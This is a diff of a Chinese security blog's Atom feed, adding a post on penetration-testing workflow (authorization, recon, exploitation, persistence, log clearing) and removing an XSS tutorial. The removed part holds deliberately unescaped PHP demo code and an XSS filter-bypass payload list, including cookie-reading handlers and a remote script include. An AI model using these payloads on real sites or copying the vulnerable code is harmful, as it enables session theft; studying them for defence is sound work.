@@ -1,11 +1,159 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-07-27T10:18:11-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">lazycat</title><subtitle>lazycat&lt;br/&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-07-29T01:21:22-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">lazycat</title><subtitle>lazycat&lt;br/&gt;
 &lt;a href=&quot;mailto:verylazycat@outlook.com&quot;&gt;
   &lt;i class=&quot;fas fa-envelope&quot;&gt;&lt;/i&gt;
 &lt;/a&gt;
 &lt;a href=&quot;https://github.com/verylazycat&quot;&gt;
   &lt;i class=&quot;fab fa-github&quot;&gt;&lt;/i&gt;
 &lt;/a&gt;
-</subtitle><entry><title type="html">linux&amp;amp;win计划任务</title><link href="http://localhost:4000/_posts/2020-07-27-linux&win%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/" rel="alternate" type="text/html" title="linux&amp;win计划任务" /><published>2020-07-27T00:00:00-04:00</published><updated>2020-07-27T00:00:00-04:00</updated><id>http://localhost:4000/_posts/linux&amp;win%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-27-linux&amp;win%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/">&lt;p&gt;[toc]&lt;/p&gt;
+</subtitle><entry><title type="html">渗透测试流程</title><link href="http://localhost:4000/_posts/2020-07-29-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/" rel="alternate" type="text/html" title="渗透测试流程" /><published>2020-07-29T00:00:00-04:00</published><updated>2020-07-29T00:00:00-04:00</updated><id>http://localhost:4000/_posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-29-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/">&lt;p&gt;[toc]&lt;/p&gt;
+
+&lt;h1 id=&quot;明确目标&quot;&gt;明确目标&lt;/h1&gt;
+
+&lt;h2 id=&quot;确定范围&quot;&gt;确定范围&lt;/h2&gt;
+
+&lt;p&gt;IP、域名、内外网、整站、部分模块……&lt;/p&gt;
+
+&lt;h2 id=&quot;确定规则&quot;&gt;确定规则&lt;/h2&gt;
+
+&lt;p&gt;能渗透到什么程度,是发现漏洞即可还是需要利用该漏洞、时间限制、能否修改上传、能否提权……&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;目标系统介绍、重点保护对象及特性&lt;/p&gt;
+
+  &lt;p&gt;是否允许破坏数据？&lt;/p&gt;
+
+  &lt;p&gt;是否允许阻断业务正常运行&lt;/p&gt;
+
+  &lt;p&gt;测试之前是否应当知会甲方安全部门，IP是否需要加白&lt;/p&gt;
+
+  &lt;p&gt;接入方式？外网和内网？&lt;/p&gt;
+
+  &lt;p&gt;测试是发现问题即可，还是尽可能发现更多问题&lt;/p&gt;
+
+  &lt;p&gt;测试过程是否需要考虑社会工程手段&lt;/p&gt;
+
+  &lt;p&gt;测试过程中要求完全仿真，除了破坏操作需要报备，其余手段不受限制还是如何&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;确定需求&quot;&gt;确定需求&lt;/h2&gt;
+
+&lt;p&gt;上线前的web应用测试、业务逻辑漏洞测试、人员权限管理漏洞测试&lt;/p&gt;
+
+&lt;h1 id=&quot;分析风险获得授权&quot;&gt;分析风险，获得授权&lt;/h1&gt;
+
+&lt;p&gt;需分析渗透过程可能产生的风险：测试是否对系统产生影响、带宽占用、系统资源消耗、爆破测试行为或其他可能触发动态感知系统或其他告警机制、影响正常业务开展、服务器发生异常的应急、数据备份和恢复、测试人力物力成本……&lt;/p&gt;
+
+&lt;p&gt;由乙方书写实施方案初稿提交给甲方或公司内部审核,审核通过后，测试人必须拿到正规的乙方书面委托授权书才能开工，代理商第三方授权不具备法律效力，若是第三方授权，必须拿到甲方给中间商的授权，且注明中间商有转让授权的权限，这样中间商下发的授权测试才是合法的。需要提前跟甲方确认是否能提供测试账号，测试账号最好覆盖各个权限级别，金融行业或者交易类的测试账号需要账户中有一定的余额……&lt;/p&gt;
+
+&lt;h1 id=&quot;信息搜集&quot;&gt;信息搜集&lt;/h1&gt;
+
+&lt;p&gt;信息搜集的方法很多，不详细阐述，大概列举如下:&lt;/p&gt;
+
+&lt;p&gt;方 式：主动扫描+开放搜索&lt;/p&gt;
+
+&lt;p&gt;基础信息：IP、网段、域名、端口……&lt;/p&gt;
+
+&lt;p&gt;系统信息：操作系统版本……&lt;/p&gt;
+
+&lt;p&gt;应用信息：各端口应用、例如web应用、邮件应用、脚本语言类型、目录结构、数据库类型、web框架……&lt;/p&gt;
+
+&lt;p&gt;版本信息：所有探测到的版本&lt;/p&gt;
+
+&lt;p&gt;服务信息: 服务器类型、版本&lt;/p&gt;
+
+&lt;p&gt;人员信息: 域名注册人信息，web应用中网站发帖人的id,管理员姓名等&lt;/p&gt;
+
+&lt;p&gt;防护信息：尝试探测防护设备&lt;/p&gt;
+
+&lt;h1 id=&quot;漏洞探测&quot;&gt;漏洞探测&lt;/h1&gt;
+
+&lt;p&gt;汇总信息搜集到的信息，使用与之匹配的漏洞检测策略&lt;/p&gt;
+
+&lt;p&gt;方法:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;1.漏扫:AWVS、AppScan、Nessus……&lt;/p&gt;
+
+  &lt;p&gt;2.漏扫结果去exploit-db等位置找利用&lt;/p&gt;
+
+  &lt;p&gt;3.在网上寻找验证POC&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;内容:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;系统漏洞:系统没能及时更新补丁&lt;/p&gt;
+
+  &lt;p&gt;Webserver漏洞:webserver配置问题……&lt;/p&gt;
+
+  &lt;p&gt;Web应用漏洞:Web应用开发问题、错误页面未定义、后台暴露……&lt;/p&gt;
+
+  &lt;p&gt;其他端口服务器漏洞:诸如21/8080(st2)/7001/22/3389……&lt;/p&gt;
+
+  &lt;p&gt;通信安全：明文传输、token在cookie中传送……&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h1 id=&quot;漏洞验证&quot;&gt;漏洞验证&lt;/h1&gt;
+
+&lt;p&gt;通过自己经验分析可能成功利用的全部漏洞都验证一遍，结合实施环境，搭建模拟环境进行试验，利用成功后再实施在目标系统中&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;自动化验证:结合自动化扫描工具发现的结果&lt;/p&gt;
+
+  &lt;p&gt;手工验证:利用公开资源进行验证&lt;/p&gt;
+
+  &lt;p&gt;试验验证:自己搭建模拟环境进行验证&lt;/p&gt;
+
+  &lt;p&gt;登录猜测:尝试猜测登录、万能密码、注入&lt;/p&gt;
+
+  &lt;p&gt;业务漏洞验证:发现后该漏洞，进行验证&lt;/p&gt;
+
+  &lt;p&gt;公开资源利用:exploit-db/wooyun/、渗透代码网站、通用、缺省口令、厂商的漏洞告警……&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h1 id=&quot;信息分析&quot;&gt;信息分析&lt;/h1&gt;
+
+&lt;p&gt;实施渗透的准备环节&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;精准攻击:利用4&amp;gt;探测到的EXP,进行精准攻击&lt;/p&gt;
+
+  &lt;p&gt;绕过防御机制:检测是否有WAF等，绕过策略筹划&lt;/p&gt;
+
+  &lt;p&gt;定制攻击路径:最佳攻击路径、主要根据薄弱入口，高内网权限位置，最终目标等&lt;/p&gt;
+
+  &lt;p&gt;绕过检测机制：是否有检测机制，流量监控，杀毒软件，恶意代码（免杀）检测&lt;/p&gt;
+
+  &lt;p&gt;攻击代码：试验得来的代码，包括不限于xss代码,sql注入语句……&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h1 id=&quot;利用漏洞&quot;&gt;利用漏洞&lt;/h1&gt;
+
+&lt;p&gt;实施攻击:根据前几步的结果，实施精准攻击&lt;/p&gt;
+
+&lt;p&gt;获取内部信息:基础设施(网络连接、vpn、路由、网络拓扑、内网IT资产……)&lt;/p&gt;
+
+&lt;p&gt;横向渗透:内网入侵、敏感目标&lt;/p&gt;
+
+&lt;p&gt;持续性存在:一般情况，甲方不需要，rookit、后门、添加管理员账号、驻扎手法等&lt;/p&gt;
+
+&lt;p&gt;清除痕迹:清理渗透相关日志（访问、操作），漏扫，上传文件等&lt;/p&gt;
+
+&lt;h1 id=&quot;信息整理&quot;&gt;信息整理&lt;/h1&gt;
+
+&lt;p&gt;整理渗透工具：整理渗透中使用的代码、POC、EXP等。&lt;/p&gt;
+
+&lt;p&gt;整理收集信息：整个渗透过程中收集的一切信息。&lt;/p&gt;
+
+&lt;p&gt;整理漏洞信息：整个渗透过程中利用成功的所有漏洞，各种脆弱位置信息，为书写渗透报告做准备。&lt;/p&gt;
+
+&lt;h1 id=&quot;形成报告&quot;&gt;形成报告&lt;/h1&gt;
+
+&lt;p&gt;按需整理：按照之前第一步跟甲方确认的范围、需求来整理资料，技术细节尽可能的详细，形成报告进行交付。&lt;/p&gt;
+
+&lt;p&gt;补充介绍：需对漏洞成因，验证过程中带来的危害进行分析&lt;/p&gt;
+
+&lt;p&gt;修补建议：给开发或运维人员提出合理高效安全的解决方案&lt;/p&gt;</content><author><name></name></author><category term="安全" /><summary type="html">[toc]</summary></entry><entry><title type="html">linux&amp;amp;win计划任务</title><link href="http://localhost:4000/_posts/2020-07-27-linux&win%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/" rel="alternate" type="text/html" title="linux&amp;win计划任务" /><published>2020-07-27T00:00:00-04:00</published><updated>2020-07-27T00:00:00-04:00</updated><id>http://localhost:4000/_posts/linux&amp;win%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-27-linux&amp;win%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/">&lt;p&gt;[toc]&lt;/p&gt;
 
 &lt;h1 id=&quot;linux&quot;&gt;linux&lt;/h1&gt;
 
@@ -3470,1360 +3618,4 @@ PORT    STATE SERVICE
 
 Host script results:                                         
 | dns-brute:                                &amp;amp;n                
-&lt;/code&gt;&lt;/pre&gt;</content><author><name></name></author><category term="安全" /><summary type="html">[toc]</summary></entry><entry><title type="html">xss</title><link href="http://localhost:4000/_posts/2020-07-11-xss/" rel="alternate" type="text/html" title="xss" /><published>2020-07-11T00:00:00-04:00</published><updated>2020-07-11T00:00:00-04:00</updated><id>http://localhost:4000/_posts/xss</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-11-xss/">&lt;p&gt;[toc]&lt;/p&gt;
-
-&lt;h1 id=&quot;xss概念&quot;&gt;XSS概念&lt;/h1&gt;
-
-&lt;p&gt;跨站脚本攻击是指恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。
- xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以xss漏洞关键就是&lt;strong&gt;寻找参数未过滤的输出函数&lt;/strong&gt;。
- 常见的输出函数有： &lt;code&gt;echo printf print print_r sprintf die var-dump var_export&lt;/code&gt;&lt;/p&gt;
-
-&lt;h1 id=&quot;分类&quot;&gt;分类&lt;/h1&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;反射型XSS：**&lt;非持久化&gt;** 攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。&lt;/非持久化&gt;&lt;/li&gt;
-  &lt;li&gt;存储型XSS：**&lt;持久化&gt;** 代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS非常危险，容易造成蠕虫，大量盗窃cookie（虽然还有种DOM型XSS，但是也还是包括在存储型XSS内）&lt;/持久化&gt;&lt;/li&gt;
-  &lt;li&gt;DOM型XSS：基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如uRI ，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM XSS漏洞&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h1 id=&quot;原理&quot;&gt;原理&lt;/h1&gt;
-
-&lt;h2 id=&quot;反射型&quot;&gt;反射型&lt;/h2&gt;
-
-&lt;p&gt;新建一个xss.php文件并加入以下代码:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;\\XSS反射演示  
-&amp;lt;form action=&quot;&quot; method=&quot;get&quot;&amp;gt;  
-    &amp;lt;input type=&quot;text&quot; name=&quot;xss&quot;/&amp;gt;  
-    &amp;lt;input type=&quot;submit&quot; value=&quot;test&quot;/&amp;gt;  
-&amp;lt;/form&amp;gt;  
-&amp;lt;?php  
-    $xss = @$_GET['xss'];  
-    if($xss!==null){  
-        echo $xss;  
-    }
-?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;这段代码中首先包含一个表单，用于向页面自己发送&lt;code&gt;GET&lt;/code&gt;请求，带一个名为xss的参数。 然后PHP会读取该参数，如果不为空，则直接打印出来，这里不存在任何过滤。也就是说，如果xss中存在HTML结构性的内容，打印之后会直接解释为HTML元素。&lt;/p&gt;
-
-&lt;p&gt;直接输入一个js代码，比如&lt;code&gt;&amp;lt;script&amp;gt;alert('hack')&amp;lt;/script&amp;gt;&lt;/code&gt;可以看到触发弹窗&lt;/p&gt;
-
-&lt;h2 id=&quot;存储型&quot;&gt;存储型&lt;/h2&gt;
-
-&lt;p&gt;把xss.php内容改为下述内容:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;\\存储XSS演示  
-&amp;lt;form action=&quot;&quot; method=&quot;post&quot;&amp;gt;  
-    &amp;lt;input type=&quot;text&quot; name=&quot;xss&quot;/&amp;gt;  
-    &amp;lt;input type=&quot;submit&quot; value=&quot;test&quot;/&amp;gt;  
-&amp;lt;/form&amp;gt;  
-&amp;lt;?php  
-    $xss=@$_POST['xss'];  
-    mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;123&quot;);  
-    mysql_select_db(&quot;xss&quot;);  
-    if($xss!==null){  
-        $sql=&quot;insert into temp(id,payload) values('1','$xss')&quot;;  
-        $result=mysql_query($sql);  
-        echo $result;  
-    }
-?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;用户输入的内容还是没有过滤，但是不直接显示在页面中，而是插入到了数据库&lt;/p&gt;
-
-&lt;p&gt;新建show.php，内容为：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;?php 
-    mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);  
-    mysql_select_db(&quot;xss&quot;);  
-    $sql=&quot;select payload from temp where id=1&quot;;  
-    $result=mysql_query($sql);  
-    while($row=mysql_fetch_array($result)){  
-        echo $row['payload'];  
-    }
-?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;该代码从数据库读取了之前插入的内容，并将其显示出来&lt;/p&gt;
-
-&lt;p&gt;直接输入一个js代码，比如&lt;code&gt;&amp;lt;script&amp;gt;alert('hack')&amp;lt;/script&amp;gt;&lt;/code&gt;可以看到触发弹窗,且保存到数据库中了&lt;/p&gt;
-
-&lt;h2 id=&quot;dom型&quot;&gt;DOM型&lt;/h2&gt;
-
-&lt;p&gt;把xss.php内容改为&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;?php  
-    error_reporting(0); //禁用错误报告  
-    $name = $_GET[&quot;name&quot;];  
-?&amp;gt;  
-&amp;lt;input id=&quot;text&quot; type=&quot;text&quot; value=&quot;&amp;lt;?php echo $name;?&amp;gt;&quot; /&amp;gt;  
-&amp;lt;div id=&quot;print&quot;&amp;gt;&amp;lt;/div&amp;gt;  
-&amp;lt;script type=&quot;text/javascript&quot;&amp;gt;  
-    var text = document.getElementById(&quot;text&quot;);   
-    var print = document.getElementById(&quot;print&quot;);  
-    print.innerHTML = text.value; // 获取 text的值，并且输出在print内。这里是导致xss的主要原因。  
-&amp;lt;/script&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;在URL构造：&lt;em&gt;?name=&amp;lt; img src=1 onerror = alert(xss)&amp;gt;&lt;/em&gt;&lt;/p&gt;
-
-&lt;p&gt;触发弹窗&lt;/p&gt;
-
-&lt;h1 id=&quot;绕过过滤器&quot;&gt;绕过过滤器&lt;/h1&gt;
-
-&lt;h2 id=&quot;xss定位器&quot;&gt;XSS定位器&lt;/h2&gt;
-
-&lt;p&gt;在大多数存在漏洞且不需要特定XSS攻击代码的地方插入下列代码会弹出包含“XSS”字样的对话框。使用URL编码器来对整个代码进行编码。小技巧：如果你时间很紧想要快速检查页面，通常只要插入“&lt;任意文本&gt;”标签，然后观察页面输出是否明显改变了就可以判断是否存在漏洞：&lt;/任意文本&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//&quot;;
-
-alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//--
-
-&amp;gt;&amp;lt;/SCRIPT&amp;gt;&quot;&amp;gt;'&amp;gt;&amp;lt;SCRIPT&amp;gt;alert(String.fromCharCode(88,83,83))&amp;lt;/SCRIPT&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;如果你没有足够的空间并且知道页面上没有存在漏洞的JavaScript，这个字符串是一个不错的简洁XSS注入检查。注入后查看页面源代码并且寻找是否存在&lt;strong&gt;&amp;lt;XSS&lt;/strong&gt; 或&lt;strong&gt;&amp;lt;XSS&lt;/strong&gt;字样来确认是否存在漏洞&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;'';!--&quot;&amp;lt;XSS&amp;gt;=&amp;amp;{()}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;无过滤绕过&quot;&gt;无过滤绕过&lt;/h2&gt;
-
-&lt;p&gt;这是一个常规的XSS注入代码，虽然通常它会被防御，但是建议首先去测试一下。（引号在任何现代浏览器中都不需要，所以这里省略了它）：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;SCRIPT SRC=http://xss.rocks/xss.js&amp;gt;&amp;lt;/SCRIPT&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;利用多语言进行过滤绕过&quot;&gt;利用多语言进行过滤绕过&lt;/h2&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;'&quot;&amp;gt;&amp;gt;&amp;lt;marquee&amp;gt;&amp;lt;img src=x onerror=confirm(1)&amp;gt;&amp;lt;/marquee&amp;gt;&quot;&amp;gt;&amp;lt;/plaintext\&amp;gt;&amp;lt;/|\&amp;gt;&amp;lt;plaintext/onmouseover=prompt(1)&amp;gt;
-
-&amp;lt;script&amp;gt;prompt(1)&amp;lt;/script&amp;gt;@gmail.com&amp;lt;isindex formaction=javascript:alert(/XSS/) type=submit&amp;gt;'--&amp;gt;&quot;&amp;gt;&amp;lt;/script&amp;gt;
-
-&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;&quot;&amp;gt;
-
-&amp;lt;img/id=&quot;confirm&amp;amp;lpar;1)&quot;/alt=&quot;/&quot;src=&quot;/&quot;onerror=eval(id)&amp;gt;'&quot;&amp;gt;
-
-&amp;lt;img src=&quot;http://www.shellypalmer.com/wp-content/images/2015/07/hacked-compressor.jpg&quot;&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;通过javascript命令实现的图片xss&quot;&gt;通过JavaScript命令实现的图片XSS&lt;/h2&gt;
-
-&lt;p&gt;图片注入使用JavaScript命令实现（IE7.0 不支持在图片上下文中使用JavaScript 命令，但是可以在其他上下文触发。下面的例子展示了一种其他标签依旧通用的原理）&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC=&quot;javascript:alert('XSS');&quot;&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;无分号无引号&quot;&gt;无分号无引号&lt;/h2&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC=javascript:alert('XSS')&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;不区分大小写的xss攻击向量&quot;&gt;不区分大小写的XSS攻击向量&lt;/h2&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC=JaVaScRiPt:alert('XSS')&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;html实体&quot;&gt;HTML实体&lt;/h2&gt;
-
-&lt;p&gt;必须有分号才可生效&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC=javascript:alert(&amp;amp;quot;XSS&amp;amp;quot;)&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;重音符混淆&quot;&gt;重音符混淆&lt;/h2&gt;
-
-&lt;p&gt;如果你的JavaScript代码中需要同时使用单引号和双引号，那么可以使用重音符（`）来包含JavaScript 代码。这通常会有很大帮助，因为大部分跨站脚本过滤器都没有过滤这个字符&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC=`javascript:alert(&quot;RSnake says, 'XSS'&quot;)`&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;畸形的a标签&quot;&gt;畸形的A标签&lt;/h2&gt;
-
-&lt;p&gt;跳过HREF标签找到XSS的重点。。。由DavidCross提交~已在Chrome上验证&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;a onmouseover=&quot;alert(document.cookie)&quot;&amp;gt;xxs link&amp;lt;/a&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;此外Chrome经常帮你补全确实的引号。。。如果在这方面遇到问题就直接省略引号，Chrome会帮你补全在URL或脚本中缺少的引号&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;a onmouseover=alert(document.cookie)&amp;gt;xxs link&amp;lt;/a&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;畸形的img标签&quot;&gt;畸形的IMG标签&lt;/h2&gt;
-
-&lt;p&gt;最初由Begeek发现（短小精湛适用于所有浏览器），这个XSS攻击向量使用了不严格的渲染引擎来构造含有IMG标签并被引号包含的XSS攻击向量。我猜测这种解析原来是为了兼容不规范的编码。这会让它更加难以正确的解析HTML标签&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG &quot;&quot;&quot;&amp;gt;&amp;lt;SCRIPT&amp;gt;alert(&quot;XSS&quot;)&amp;lt;/SCRIPT&amp;gt;&quot;&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;fromcharcode函数&quot;&gt;fromCharCode函数&lt;/h2&gt;
-
-&lt;p&gt;如果不允许任何形式的引号，你可以通过执行JavaScript里的fromCharCode函数来创建任何你需要的XSS攻击向量&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;使用默认src属性绕过src域名过滤器&quot;&gt;使用默认SRC属性绕过SRC域名过滤器&lt;/h2&gt;
-
-&lt;p&gt;这种方法可以绕过大多数SRC域名过滤器。将JavaScript代码插入事件方法同样适用于注入使用elements的任何HTML标签，例如Form,Iframe, Input,  Embed等等。它同样允许将事件替换为任何标签中可用的事件类型，例如onblur,onclick。下面会给出许多不同的可注入事件列表。由David Cross提交，Abdullah Hussam(@Abdulahhusam)编辑&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC=# onmouseover=&quot;alert('xxs')&quot;&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;使用默认为空的src属性&quot;&gt;使用默认为空的SRC属性&lt;/h2&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC= onmouseover=&quot;alert('xxs')&quot;&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;使用不含src属性&quot;&gt;使用不含SRC属性&lt;/h2&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG onmouseover=&quot;alert('xxs')&quot;&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;通过error事件触发alert&quot;&gt;通过error事件触发alert&lt;/h2&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC=/ onerror=&quot;alert(String.fromCharCode(88,83,83))&quot;&amp;gt;&amp;lt;/img&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;对img标签中onerror属性进行编码&quot;&gt;对IMG标签中onerror属性进行编码&lt;/h2&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;img src=x onerror=&quot;&amp;amp;#0000106&amp;amp;#0000097&amp;amp;#0000118&amp;amp;#0000097&amp;amp;#0000115&amp;amp;#0000099&amp;amp;#0000114&amp;amp;#0000105&amp;amp;#0000112&amp;amp;#0000116&amp;amp;#0000058&amp;amp;#0000097&amp;amp;#0000108&amp;amp;#0000101&amp;amp;#0000114&amp;amp;#0000116&amp;amp;#0000040&amp;amp;#0000039&amp;amp;#0000088&amp;amp;#0000083&amp;amp;#0000083&amp;amp;#0000039&amp;amp;#0000041&quot;&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;十进制html字符实体编码&quot;&gt;十进制HTML字符实体编码&lt;/h2&gt;
-
-&lt;p&gt;所有在IMG标签里直接使用javascript:形式的XSS示例无法在Firefox或Netscape8.1以上浏览器（使用Gecko渲染引擎）运行&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt; &amp;lt;IMG SRC=&amp;amp;#106;&amp;amp;#97;&amp;amp;#118;&amp;amp;#97;&amp;amp;#115;&amp;amp;#99;&amp;amp;#114;&amp;amp;#105;&amp;amp;#112;&amp;amp;#116;&amp;amp;#58;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;
-    &amp;amp;#39;&amp;amp;#88;&amp;amp;#83;&amp;amp;#83;&amp;amp;#39;&amp;amp;#41;&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;不带分号的十进制html字符实体编码&quot;&gt;不带分号的十进制HTML字符实体编码&lt;/h2&gt;
-
-&lt;p&gt;这对于绕过对“&amp;amp;#XX;”形式的XSS过滤非常有用，因为大多数人不知道最长可使用7位数字。这同样对例如$tmp_string  =~s/.&lt;em&gt;\&amp;amp;#(\d+);.&lt;/em&gt;/$1/;形式的过滤器有效，这种过滤器是错误的认为HTML字符实体编码需要用分号结尾（无意中发现的&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt; &amp;lt;IMG SRC=&amp;amp;#0000106&amp;amp;#0000097&amp;amp;#0000118&amp;amp;#0000097&amp;amp;#0000115&amp;amp;#0000099&amp;amp;#0000114&amp;amp;#0000105&amp;amp;#0000112&amp;amp;#0000116&amp;amp;#0000058&amp;amp;#0000097&amp;amp;   #0000108&amp;amp;#0000101&amp;amp;#0000114&amp;amp;#0000116&amp;amp;#0000040&amp;amp;#0000039&amp;amp;#0000088&amp;amp;#0000083&amp;amp;#0000083&amp;amp;#0000039&amp;amp;#0000041&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
